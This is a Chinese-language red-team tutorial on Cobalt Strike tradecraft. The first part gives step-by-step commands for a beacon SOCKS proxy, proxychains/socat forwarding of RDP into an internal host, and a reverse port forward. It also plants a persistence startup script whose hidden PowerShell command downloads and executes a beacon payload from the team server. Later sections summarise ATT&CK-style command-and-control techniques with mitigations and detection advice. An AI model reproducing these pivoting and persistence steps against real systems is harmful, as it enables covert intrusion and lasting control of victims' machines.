### 设置团队服务器并配置SOCKS代理

在通过RDP进行跳转之前，首先需要建立命令与控制的通道。为此，可以设置一个SOCKS代理。这样，远程访问自己的服务器就等同于直接远程访问目标主机，从而实现流量的间接传输。

#### 比喻说明
假设你需要将钱交给朋友，但你不能直接给他。于是你找了一个中间人，把钱交给他，再由他转交给你的朋友。这个过程类似于通过代理服务器转发流量。

#### 具体步骤
1. **创建SOCKS代理**：
   ```shell
   > beacon> socks 1337
   ```
2. **安装socat和proxychains**：
   - 修改`proxychains.conf`文件，添加以下内容：
     ```plaintext
     127.0.0.1:1337
     ```
   - 运行以下命令：
     ```shell
     > proxychains socat TCP4-LISTEN:3389,fork TCP4:10.0.0.100:3389
     ```
   - 此命令会监听本地3389端口，并将流量重定向到`10.0.0.100:3389`。

3. **SSH进入团队服务器**：
   - 任何使用3389端口的流量都会被重定向到`10.0.0.100:3389`。
   - 攻击者可以通过互联网中的服务器，利用SOCKS代理将3389端口的流量重定向到目标工作站。

4. **发起C2指令**：
   - 使用自己的电脑通过rastamouseadm账户进入jump box网络环境。

### 持久性设置

为了确保在账户主人登录时能够持续控制目标系统，可以设置持久性元素。例如，创建一个无阶段PowerShell SMB Beacon有效负载，并将其托管在团队服务器上。

#### 具体步骤
1. **创建无阶段PowerShell SMB Beacon**：
   - 将有效负载托管在团队服务器的/smb目录下。
   - 在当前灯塔上创建反向端口转发：
     ```shell
     > rportfwd 8080 178.62.56.134 80
     ```
   - 创建启动脚本：
     ```plaintext
     C:\Users\rasta_mouse_adm\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\startup.bat
     ```
     脚本内容：
     ```powershell
     powershell.exe -nop -w hidden -c "iex ((new-object net.webclient).downloadstring('http://10.0.1.200:8080/smb'))"
     ```

2. **注销RDP会话**：
   - 当真实用户登录时，会在博客中看到相关消息。

### 进入秘密网络

同样地，可以设置RDP跳转来访问隔离的网络环境。参考资料：[利用RDP跳跃网络隔离](https://rastamouse.me/2017/08/jumping-network-segregation-with-rdp/) 和 [SMB Beacon](https://github.com/aleenzz/CobaltStrikewiki/blob/master/%E7%AC%AC%E4%B8%89%E8%8A%82%5BSMB%20Beacon%5D.md)

### C&C（Command and Control）

攻击者试图与受损系统通信以控制它们。指挥和控制涉及多种技术，对手可以利用这些技术在受害者网络中与其控制的系统通信。对手通常模仿正常的网络流量以避免被发现。

#### 常用端口
- **TCP:80 (HTTP)**
- **TCP:443 (HTTPS)**
- **TCP:25 (SMTP)**
- **TCP/UDP:53 (DNS)**
- **TCP/UDP:135 (RPC)**
- **TCP/UDP:22 (SSH)**
- **TCP/UDP:3389 (RDP)**

#### 缓解措施
- **网络签名**：使用网络入侵检测和防御系统识别特定恶意软件流量。
- **网络分割**：配置内部和外部防火墙，阻塞不必要的网络协议流量。

#### 举例
- **APT18**：使用端口80进行C2通信。
- **APT29**：使用端口443进行C2通信。
- **APT3**：使用HTTPS/443执行命令和控制。

#### 检测
- 分析不常见的数据流（如客户端发送的数据明显多于从服务器接收的数据）。
- 监控通常没有网络通信或从未见过的进程。
- 分析数据包内容以检测不符合预期协议行为的通信。

### 通过移动媒体进行通信

在断开连接的网络上，可以使用可移动媒体将命令从一个系统传输到另一个系统。两个系统都需要被破坏，首先是联网的系统，然后是通过可移动媒体复制的横向移动。

#### 缓解措施
- **禁用自动运行**：如果没有必要，禁用自动运行功能。
- **操作系统配置**：如果业务操作不需要可移动媒体，在组织策略级别上禁止或限制其使用。

#### 举例
- **APT28**：使用受感染的USB从漏气的计算机上捕获信息，并在插入USB时将信息传输到联网的计算机上。

#### 检测
- 监视可移动媒体上的文件访问。
- 检测安装可移动介质时执行的进程。

### 连接代理

连接代理用于引导系统之间的网络流量或充当网络通信的中介。有许多工具支持流量重定向，包括HTRAN、ZXProxy和ZXPortMap。

#### 缓解措施
- **网络签名**：使用网络入侵检测和防御系统识别特定恶意软件流量。
- **网络分割**：配置防火墙和代理，限制仅通过必要端口和适当的网络网关系统的传出流量。

#### 举例
- **APT28**：使用其他受害者作为代理来传递命令流量。
- **Cobalt Strike**：允许攻击者修改“信标”有效载荷通信的方式，称为“Malleable C2”。

#### 检测
- 分析不常见的数据流。
- 监控通常没有网络通信或从未见过的进程。
- 分析数据包内容以检测不符合预期协议行为的通信。

### 自定义命令和控制协议

攻击者可以使用自定义命令和控制协议进行通信，而不是在现有标准应用层协议中封装命令/数据。

#### 缓解措施
- **过滤网络流量**：查找异常或非标准协议。
- **网络入侵预防**：使用网络签名识别特定恶意软件流量。

#### 举例
- **APT32**：使用Cobalt Strike的可延展C2功能融入网络流量。
- **Duqu**：通过端口443使用其命令和控制协议，还能够通过标准应用层协议封装其命令协议。

#### 检测
- 分析ICMP消息或其他包含异常数据的协议。
- 分析不常见数据流。
- 监控通常没有网络通信或从未见过的进程。
- 分析数据包内容以检测不符合预期协议行为的通信。

### 自定义加密协议

攻击者可以使用自定义加密协议或算法来隐藏命令和控制流量。恶意软件样本的分析和逆向工程可能有助于发现所使用的算法和加密密钥。

#### 缓解措施
- **网络入侵预防**：使用网络签名识别特定恶意软件流量。

#### 举例
- **APT32**：使用Cobalt Strike的可延展C2功能融入网络流量。
- **Duqu**：通过端口443使用其命令和控制协议，还能够通过标准应用层协议封装其命令协议。

#### 检测
- 分析ICMP消息或其他包含异常数据的协议。
- 分析不常见数据流。
- 监控通常没有网络通信或从未见过的进程。
- 分析数据包内容以检测不符合预期协议行为的通信。

希望这些优化后的文本能帮助你更好地理解和实施相关的网络安全措施。